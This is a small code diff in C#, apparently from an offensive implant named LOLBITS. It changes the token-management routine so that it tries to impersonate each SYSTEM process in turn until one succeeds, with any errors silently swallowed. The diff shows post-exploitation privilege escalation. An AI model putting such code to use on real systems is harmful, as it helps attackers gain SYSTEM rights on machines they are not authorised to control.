@@ -108,9 +108,12 @@ namespace LOLBITS.TokenManagement
 
             try
             {
-                int pid = Utils.getSystemPID(sysCall);
-                if (Impersonate(pid, sysCall))
-                    return true;
+                List<int> pids = Utils.getSystemPID(sysCall);
+                foreach (var pid in pids)
+                {
+                    if (Impersonate(pid, sysCall))
+                        return true;
+                }
             }
             catch {}
  
